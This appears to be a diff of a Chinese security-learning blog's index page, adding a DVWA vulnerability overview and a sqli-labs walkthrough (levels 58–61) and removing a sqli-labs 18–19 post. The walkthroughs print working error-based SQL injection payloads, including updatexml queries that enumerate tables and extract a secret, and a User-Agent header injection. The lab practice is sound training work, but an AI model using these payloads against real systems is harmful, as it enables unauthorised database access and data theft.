@@ -145,6 +145,140 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/22/article-title-18/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Yanghaoxuan">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Yanghaoxuan'sBlog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/01/22/article-title-18/" class="post-title-link" itemprop="url">DVWA</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-01-22 11:04:38 / 修改时间：20:00:16" itemprop="dateCreated datePublished" datetime="2021-01-22T11:04:38+08:00">2021-01-22</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h4 id="DVWA（Damn-Vulnerable-Web-Application）是一个用来进行安全脆弱性鉴定的PHP-MySQL-Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。"><a href="#DVWA（Damn-Vulnerable-Web-Application）是一个用来进行安全脆弱性鉴定的PHP-MySQL-Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。" class="headerlink" title="DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。"></a><strong>DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。</strong></h4><p>DVWA共有十个模块，分别是Brute Force（暴力（破解））、Command Injection（命令行注入）、CSRF（跨站请求伪造）、File Inclusion（文件包含）、File Upload（文件上传）、Insecure CAPTCHA （不安全的验证码）、SQL Injection（SQL注入）、SQL Injection（Blind）（SQL盲注）、XSS（Reflected）（反射型跨站脚本）、XSS（Stored）（存储型跨站脚本）。DVWA 1.9的代码分为四种安全级别：Low，Medium，High，Impossible。</p>
+<h5 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h5><p>Brute Force，即暴力（破解），是指黑客利用密码字典，使用穷举法猜解出用户口令，是现在最为广泛使用的攻击手法之一，如2014年轰动全国的12306“撞库”事件，实质就是暴力破解攻击。</p>
+<h5 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h5><p>Command Injection，即命令注入，是指通过提交恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的。PHP命令注入攻击漏洞是PHP应用程序中常见的脚本漏洞之一，国内著名的Web应用程序Discuz!、DedeCMS等都曾经存在过该类型漏洞。</p>
+<h5 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h5><p>CSRF，全称Cross-site request forgery，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。</p>
+<h5 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a><strong>File Inclusion</strong></h5><p>File Inclusion，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。</p>
+<h4 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h4><p>File Upload，即文件上传漏洞，通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的webshell权限，因此文件上传漏洞带来的危害常常是毁灭性的</p>
+<h4 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a><strong>SQL Injection</strong></h4><p>SQL Injection，即SQL注入，是指攻击者通过注入恶意的SQL命令，破坏SQL查询语句的结构，从而达到执行恶意SQL语句的目的。SQL注入漏洞的危害是巨大的，常常会导致整个数据库被“脱裤”，尽管如此，SQL注入仍是现在最常见的Web漏洞之一。</p>
+<h4 id="SQL-Injection-Blind"><a href="#SQL-Injection-Blind" class="headerlink" title="SQL Injection(Blind)"></a><strong>SQL Injection</strong>(Blind)</h4><p>SQL Injection（Blind），即SQL盲注，与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。</p>
+<h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a><strong>XSS</strong></h4><p>XSS，全称Cross Site Scripting，即跨站脚本攻击，某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行，需要强调的是，XSS不仅仅限于JavaScript，还包括flash等其它脚本语言。根据恶意代码是否存储在服务器中，XSS可以分为存储型的XSS与反射型的XSS。</p>
+<p>DOM型的XSS由于其特殊性，常常被分为第三种，这是一种基于DOM树的XSS。例如服务器端经常使用document.boby.innerHtml等函数动态生成html页面，如果这些函数在引用某些变量时没有进行过滤或检查，就会产生DOM型的XSS。DOM型XSS可能是存储型，也有可能是反射型。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/21/article-title-17/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Yanghaoxuan">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Yanghaoxuan'sBlog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/01/21/article-title-17/" class="post-title-link" itemprop="url">sqli-labs练习(第五十八-六十一关)</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-01-21 21:43:41 / 修改时间：21:55:44" itemprop="dateCreated datePublished" datetime="2021-01-21T21:43:41+08:00">2021-01-21</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h4 id="五十八关"><a href="#五十八关" class="headerlink" title="五十八关"></a>五十八关</h4><p>这一关只有五次尝试机会，而且联合查询语句在这一关并不管用，以知库名为<code>challenges</code>，直接用语句</p>
+<p><code>?id=-1&#39; and updatexml(1, concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;challenges&#39;)),1) --+</code>爆出表名<code>d5qhcc5r3m</code></p>
+<p><code>?id=-1&#39; and updatexml(1, concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;d5qhcc5r3m&#39;)),1) --+</code>得到列名<code>secret_KNGZ</code></p>
+<p><code>?id=-1&#39; and updatexml(1, concat(0x7e,(select group_concat(concat_ws(0x7e,secret_KNGZ)) from d5qhcc5r3m)),1) --+</code>得到key <code>ToejBfm6Bn3RZSJivLuOLfgR</code></p>
+<p>成功提交。</p>
+<h4 id="五十九关"><a href="#五十九关" class="headerlink" title="五十九关"></a>五十九关</h4><p>这一关未对id值进行包裹，步骤与上一关相同。</p>
+<h4 id="六十关"><a href="#六十关" class="headerlink" title="六十关"></a>六十关</h4><p>闭合符为<code>&quot;)</code>，其他步骤皆相同。</p>
+<h4 id="六十一关"><a href="#六十一关" class="headerlink" title="六十一关"></a>六十一关</h4><p>闭合符为<code>&#39;))</code>,这是人能猜出来的？</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/20/article-title-16/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -702,147 +836,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/15/12/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Yanghaoxuan">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Yanghaoxuan'sBlog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/12/15/12/" class="post-title-link" itemprop="url">sqli-labs练习(第十八、十九关)</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-12-15 22:31:08" itemprop="dateCreated datePublished" datetime="2020-12-15T22:31:08+08:00">2020-12-15</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-12-16 16:59:38" itemprop="dateModified" datetime="2020-12-16T16:59:38+08:00">2020-12-16</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h4 id="第十八关"><a href="#第十八关" class="headerlink" title="第十八关"></a>第十八关</h4><p>此关开始之前有一个小坑需要注意，如果在第十七关中修改过密码，那么在这里应该输入的密码是重新设置的密码以及需要在火狐浏览器提前下载插件Modify Header</p>
-<p>如果输入用户名与密码登入成功，页面会显示出你的ip地址与user-agent，失败的话只会显示你的ip地址</p>
-<p>通过查看代码源可以发现作者对uname和passwd做了过滤处理，以及</p>
-<p><code>$insert=&quot;INSERT INTO security.uagents (uagent, ip_address, username) VALUES (‘$uagent‘, ‘$IP‘, $uname)&quot;</code>这个语句，所以我们不能在用户名以及密码上进行注入，但可以在user-agent上尝试注入，而且必须要在用户名和密码正确的基础上。</p>
-<p>因为uname和passwd被过滤，所以无法在post中注入，所以需要插件编写头部信息</p>
-<p><img src="http://m.qpic.cn/psc?/V10iGthh1tdqax/ruAMsa53pVQWN7FLK88i5vQ60uEhTdQUUc3XyVq3LSsf3Z1R3ZzZouHM9zUzM12YjRW8HmsPLzmJOdCFj2BzfyoRusP1MlUCKpvjdq9wzkM!/mnull&bo=egMbAQAAAAADB0E!&rf=photolist&t=5" alt="img"></p>
-<p>从insert语句中可以看出闭合符为<code>&#39;</code>,然后再使用上一关的<code>updatexml</code>的语句</p>
-<p><code>’ or updatexml(1,concat(0x7e,(database())),1),‘ ’,‘ ’)#</code>加入到插件中</p>
-<p><img src="http://m.qpic.cn/psc?/V10iGthh1tdqax/ruAMsa53pVQWN7FLK88i5s9o1aasUDim7BHN1me6cw2bOd5G0aL65Zlw3TIzomK7qlrMd8m1UVUPVR0IYVDzYAShTxE*5tBHLX2e*ue*3GI!/mnull&bo=CQPsAAAAAAADB8Q!&rf=photolist&t=5" alt="img"></p>
-<p>成功获得数据库名</p>
-<p><img src="http://m.qpic.cn/psc?/V10iGthh1tdqax/ruAMsa53pVQWN7FLK88i5s9o1aasUDim7BHN1me6cw2VdHiMF045cv6TPPUWVGP8a0*HihOotkYX*yJJlRTCk2P7ju3aglESX.ob8qq02Wo!/mnull&bo=ZgNJAgAAAAADBww!&rf=photolist&t=5" alt="img"></p>
-<p>接下来获取其他信息的语句不再描述</p>
-<h4 id="第十九关"><a href="#第十九关" class="headerlink" title="第十九关"></a>第十九关</h4><p>与上一关相同，对referer进行注入</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/15/article-title-10/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Yanghaoxuan">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Yanghaoxuan'sBlog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/12/15/article-title-10/" class="post-title-link" itemprop="url">article title</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2020-12-15 11:21:38 / 修改时间：12:08:15" itemprop="dateCreated datePublished" datetime="2020-12-15T11:21:38+08:00">2020-12-15</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>![屏幕截图 2020-12-15 112242](C:\Users\Y4n9ne\Pictures\屏幕截图 2020-12-15 112242.png)</p>
-<p>第十七关要求我们重新设置密码</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -908,7 +905,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">20</span>
+          <span class="site-state-item-count">22</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
